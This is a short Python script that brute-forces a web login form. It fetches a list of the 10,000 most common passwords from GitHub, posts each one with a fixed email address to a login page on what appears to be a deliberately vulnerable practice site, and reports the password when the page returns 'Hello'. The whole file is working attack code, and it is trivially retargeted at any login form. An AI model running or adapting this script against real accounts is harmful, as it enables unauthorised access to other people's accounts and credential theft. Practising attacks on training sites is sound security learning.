"""
this is python prog. that Bruteforce site
its get user + pass
and try to break the site
"""

import requests
from urllib.request import urlopen

#from requests import *

LIST_OF_COMMON_PASSWORDS = str(urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(),'utf-8')
#print(LIST_OF_COMMON_PASSWORDS)
URL = 'https://hack-yourself-first.com/Account/Login'
USER = 'mekifh8@rishon.il'

for guess in LIST_OF_COMMON_PASSWORDS.split('\n'): # try every password

    http = requests.post(URL,data={'Email':USER,'Password':guess}) # do the post http to try the guess
    content = http.text # read the site after http post
    print(guess)
    if 'Hello' in content: # chaeck if we success enter the login
        print(f'You Success, the password is {guess}')
        break



